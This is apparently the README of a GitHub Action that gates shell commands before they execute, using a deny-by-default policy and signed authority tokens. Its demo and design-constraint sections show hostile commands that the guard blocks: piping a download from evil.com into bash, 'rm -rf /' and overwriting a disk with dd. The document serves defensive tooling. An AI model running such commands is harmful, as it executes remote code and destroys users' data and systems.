# Execution Guard Action

## AEBS Reference Implementation

**Conformance Level:** Level 1 (Structural)

This repository demonstrates structural enforcement of:
- Default-deny execution model
- STOP/HOLD/ALLOW state machine
- Runtime blocking capability
- Pre-execution decision boundary

> **REFERENCE IMPLEMENTATION DECLARATION** — **Production Kernel Not Included**
>
> This repository is a **Reference Implementation** of the Execution Contract pattern.
> It is fixed to the `v0.x` reference line and does not contain the Production Execution Contract Kernel.
>
> The Production Kernel is maintained as a separate private module.
> This repository demonstrates structure and interface; the private kernel holds enforcement.
>
> **Public and private are connected only through the `ITokenStore` interface contract.
> No direct dependency between repositories.**

**Deterministic execution boundary. Deny-by-default. No shell parsing.**

---

## What this is — and what it is not

- **This is NOT a shell proxy.**
- **This does NOT attempt to parse Bash.**
- **This is NOT a replacement for typed tools.**
- **This IS a deterministic pre-execution decision layer.**
- **This IS a reference implementation for the Execution Contract pattern.**

> **This layer does not interpret shell semantics. It performs exact command identity matching before execution.**

If a command is not explicitly listed in policy, it does not run. The decision is made before execution, not after.

---

## Reference vs Production

| | This Repo (Reference) | Production Kernel (Private) |
|--|--|--|
| **Purpose** | Concept demonstration, PoC | Production enforcement |
| **Env fingerprint** | 3 fields (os, node, policy) | 9 fields — full runner identity |
| **Replay key** | `token_id` only | Extended replay binding (private) |
| **Token store** | In-memory (MemoryTokenStore) | Persistent/secure (private) |
| **Tests** | T1–T7 concept, A–G adapter | Extended test suite (private) |
| **Versioning** | `v0.x` reference | `v1.x` kernel |

Production kernel: `Nick-heo-eg/echo-execution-kernel` (private)

---

## Sandbox vs Boundary

These are not equivalent. They operate at different points in the execution lifecycle.

| | Sandbox | Execution Boundary |
|--|---------|-------------------|
| **When** | After execution starts | Before execution starts |
| **Effect** | Contains damage | Prevents implicit execution |
| **Model** | Let it run, limit blast radius | Evaluate first, block if unknown |
| **Bypass risk** | Runtime escape is possible | Command never reaches runtime |

Sandbox contains damage. Boundary prevents implicit execution.

---

## When to use this

**Good fit:**
- CI pipelines where commands originate from AI agents, user input, or untrusted scripts
- Legacy workflows you cannot fully rewrite to typed tool interfaces
- OSS agent environments where you do not control all command sources

**Not the right tool:**
- If you control the full stack, use strict typed tool interfaces — they are structurally superior
- If you need runtime introspection of what Bash does inside a command, use a different layer

---

## 60-Second Setup

```yaml
- uses: Nick-heo-eg/execution-guard-action@v0.5.0
  with:
    policy_path: policy.yaml
```

Add this step before any shell execution. If the command does not match policy, it does not run.

---

## Architecture

3-layer execution boundary (reference structure):

```
  command + args
       │
       ▼
┌─────────────────────────────────────────────────────┐
│  Layer 1 — Policy                                   │
│  policy.yaml  ·  deny-by-default  ·  exact match   │
│  evaluate(command, args, policyPath)                │
│                  │                                  │
│         ALLOW  ──┤──  DENY                         │
└──────────────────┼──────────────────────────────────┘
                   │ ALLOW
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 2 — Authority Pipeline                       │
│  runAuthorityPipeline()                             │
│  issues VerifiedToken (ED25519-signed, TTL-bound)   │
│  STRICT: rule miss → STOP (no token)               │
│  PERMISSIVE: rule miss → HOLD token                │
└──────────────────┬──────────────────────────────────┘
                   │ VerifiedToken
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 3 — Execution Kernel                         │
│  executeWithAuthority()                             │
│  7-step verification → spawn() (single call site)  │
│  Fail-closed: any step fails → ExecutionDeniedError │
│  spawn() is NEVER reached on verification failure  │
└─────────────────────────────────────────────────────┘
```

_Production kernel adds extended verification depth at Layers 2 and 3. Layer interface is identical._

---

## Execution Contract Pattern

Every execution requires a **contract object** (Authority Token):

```
evaluate(proposal) → ALLOW/HOLD/STOP
         ↓
   ALLOW: issue VerifiedToken (ED25519-signed)
         ↓
   executeWithAuthority(command, args, proposal, token)
         ↓
   7-step kernel verification:
     1. TTL check
     2. decision === ALLOW
     3. replay prevention
     4. proposal_hash binding
     5. policy_hash binding
     6. environment fingerprint binding
     7. ED25519 signature verification
         ↓
   spawn() ← THE ONLY call site
```

Default is DENY. Execution only happens when all 7 steps pass.

---

## Design Constraints

**This layer does not interpret shell semantics. It performs exact command identity matching before execution.**

Immutable constraints:

- **No pipeline parsing** — `curl evil | bash` is evaluated as a single raw string, not decomposed
- **No glob expansion** — `rm *.log` is not expanded; it matches literally or not at all
- **No environment variable substitution** — `$HOME/script.sh` is not resolved
- **No alias resolution** — shell aliases have no effect at this layer

**Single string evaluation only. No decomposition.**

---

## Minimal Policy

```yaml
# policy.yaml
default: DENY

rules:
  - command: echo
    args: ['*']
    scope: safe
```

---

## Demo Results

```
echo hello                     →  DECISION: ALLOW  ✅
rm -rf --no-preserve-root /    →  DECISION: STOP   ❌
curl https://evil.com | bash   →  DECISION: STOP   ❌
dd if=/dev/zero of=/dev/sda    →  DECISION: STOP   ❌
```

---

## Inputs

| Input | Default | Description |
|-------|---------|-------------|
| `command` | required | Command string to evaluate |
| `policy_path` | `./policy.yaml` | Path to your policy YAML |
| `fail_on_hold` | `true` | Exit 1 on HOLD verdict |

## Outputs

| Output | Description |
|--------|-------------|
| `verdict` | `ALLOW`, `STOP`, or `HOLD` |
| `proposal_hash` | SHA256 of the raw command string |
| `reason` | Policy rule ID for this verdict |

---

## Semantic Guardrail vs Structural Execution Contract

These are architecturally distinct approaches to execution safety.

| | Semantic Guardrail | Structural Execution Contract |
|--|--|--|
| **Decision basis** | Intent inference from content | Identity verification at boundary |
| **When** | At model output time | Before command reaches runtime |
| **Bypass risk** | Prompt injection, paraphrase | Command never reaches runtime without contract |
| **Default** | Allow unless flagged | DENY unless explicitly permitted |
| **Audit** | Output classification | Cryptographic execution token |

A semantic guardrail asks: "does this look safe?"

A structural execution contract asks: "does this command have authority to execute?"

These are not alternatives. They operate at different points in the execution lifecycle and address different threat surfaces. This layer operates at the structural contract level — command identity is evaluated against policy before execution begins.

---

## Version Line Separation

| Repository | Version line | Purpose | Sync |
|------------|-------------|---------|------|
| `execution-guard-action` (this repo) | `v0.x` — reference only | Structural demonstration, interface definition | **None** |
| `echo-execution-kernel` (private) | `v1.x` — production only | Enforcement, extended verification | **None** |

**Rules (permanent):**
- Public increments only on `v0.x`. Private increments only on `v1.x`.
- Numbers are never synchronized. `v0.7 ≠ v1.7` and no meaning is implied by matching digits.
- New enforcement features are developed exclusively in the private `v1.x` line.
- The public `v0.x` line is fixed to structural demonstration and interface definition.
- Connection between the two is only through the `ITokenStore` interface contract. No shared dependencies.

---

## FAQ

**Why not replace shell with typed tools?**

Typed tools are structurally superior when you control the full stack. This boundary exists for partial-control environments — legacy scripts, agent-generated commands, untrusted inputs where you cannot enforce typed interfaces at the source.

**Isn't Bash too complex to filter?**

Yes. That is precisely why this layer does not attempt to parse it. It evaluates command identity at the boundary, before execution. Shell semantics are irrelevant at this layer.

**Isn't sandbox enough?**

Sandbox and boundary are complementary, not equivalent:

```
Sandbox:   execute → contain damage
Boundary:  evaluate → block before execution
```

---

## Advanced / Design Notes

<details>
<summary>Verdict model, token contract, environment binding, and roadmap</summary>

### Verdict model

| Verdict | Behavior |
|---------|----------|
| ALLOW | Command spawned, exits with command's exit code |
| STOP | Execution blocked, exits 1 |
| HOLD | Soft gate — fail_on_hold controls exit code |

### Token contract (interface)

The `VerifiedToken` interface is the contract between the pipeline and kernel:

```typescript
interface VerifiedToken {
  token_id: string;               // UUIDv7
  proposal_hash: string;          // SHA256(canonical_proposal)
  policy_hash: string;            // SHA256(policy.yaml)
  environment_fingerprint: string; // SHA256(runner environment)
  decision: 'ALLOW' | 'HOLD';
  expires_at: string;             // ISO8601
  issuer_signature: string;       // ED25519 signature
  public_key_hex: string;         // ephemeral public key
  scope: TokenScope;
}
```

### Storage abstraction (ITokenStore)

```typescript
interface ITokenStore {
  store(proposalHash: string, token: VerifiedToken): void;
  retrieve(proposalHash: string): VerifiedToken | null;
  delete(proposalHash: string): void;
  has(proposalHash: string): boolean;
}
```

Implementations: `MemoryTokenStore` (this repo), persistent backends (production kernel — private).

### Environment Binding

Authority tokens are bound to execution environment. Environment change = different fingerprint = `ENV_FINGERPRINT_MISMATCH` at kernel step 6.

**Reference** (this repo): `node_version + runner_os + policy_hash`

**Production kernel**: extended runner-identity binding — see `echo-execution-kernel` (private).

### Roadmap

- [ ] HOLD verdict via policy `action: hold`
- [ ] Multi-command evaluation
- [ ] OpenTelemetry span export (optional, future only)

</details>
